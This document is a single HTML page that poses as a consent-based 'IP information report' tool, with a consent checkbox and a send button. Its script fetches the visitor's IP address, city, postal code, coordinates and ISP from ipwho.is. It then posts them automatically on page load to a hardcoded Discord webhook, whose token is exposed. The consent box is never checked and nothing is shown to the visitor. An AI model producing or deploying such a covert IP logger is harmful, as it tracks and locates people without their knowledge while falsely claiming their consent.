<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#101218">
<title>I</title>
<style>

</style>
</head>
<body>
<main>
<header>
<h1></h1>
<p></p>
</header>

<section class="panel">
<h2></h2>
<div id="results" class="grid">
<div class="item">
<div class="key">Status</div>
<div class="val">Loading...</div>
</div>
</div>
<div id="lookupStatus" class="status" role="status" aria-live="polite"></div>
</section>

<section class="panel">
<h2></h2>
<p></p>
<label>
<input type="checkbox" id="consent">
<span></span>
</label>
<div class="actions">
<button class="primary" id="sendReport" type="button"></button>
</div>
<div id="submitStatus" class="status" role="status" aria-live="polite"></div>
</section>

<footer>
</footer>
</main>

<script>
"use strict";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";

const results = document.getElementById("results");
const lookupStatus = document.getElementById("lookupStatus");
const submitStatus = document.getElementById("submitStatus");
const consent = document.getElementById("consent");
const sendButton = document.getElementById("sendReport");

let report = null;
let sending = false;

function addItem(label, value) {
    const item = document.createElement("div");
    item.className = "item";

    const key = document.createElement("div");
    key.className = "key";
    key.textContent = label;

    const val = document.createElement("div");
    val.className = "val";
    val.textContent =
        value === null || value === undefined || value === ""
            ? "Unavailable"
            : String(value);

    item.append(key, val);
    results.appendChild(item);
}

async function loadInfo() {
    report = null;
    results.replaceChildren();
    addItem("Status", "Loading...");
    lookupStatus.textContent = "";

    try {
        const response = await fetch("https://ipwho.is/", {
            cache: "no-store"
        });

        if (!response.ok) {
            throw new Error("IP lookup request failed");
        }

        const data = await response.json();

        if (data.success === false || !data.ip) {
            throw new Error(data.message || "IP lookup failed");
        }

        report = {
            ip_address: data.ip,
            ip_version: data.ip.includes(":") ? 6 : 4,
            country: data.country,
            country_code: data.country_code,
            region: data.region,
            city: data.city,
            postal_code: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone?.id ?? null,
            isp: data.connection?.isp ?? null,
            organization: data.connection?.org ?? null,
            asn: data.connection?.asn ?? null,
            domain: data.connection?.domain ?? null,
            source: "ipwho.is",
            retrieved_at: new Date().toISOString()
        };

        const fields = [
        ];

        results.replaceChildren();

        for (const [label, value] of fields) {
            addItem(label, value);
        }

       
    } catch (error) {
        report = null;
        results.replaceChildren();
        addItem("Status", "Lookup failed");

        
    }
}

async function SUND() {
    if (sending) return;

    sending = true;
    sendButton.disabled = true;
    submitStatus.textContent = "";

    const payload = {
        username: "IP Information Reports",
        allowed_mentions: {
            parse: []
        },
        embeds: [{
            title: "Consented IP Information Report",
            color: 7633914,
            fields: Object.entries(report).map(([name, value]) => ({
                name: name.replaceAll("_", " ").slice(0, 256),
                value: String(value ?? "Unavailable").slice(0, 1024),
                inline: true
            })),
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error("Discord returned HTTP " + response.status);
        }

        
    } catch (error) {
        
    } finally {
        sending = false;
        sendButton.disabled = false;
    }
}


loadInfo().then(() => {
    SUND();
});
</script>
</body>
</html>
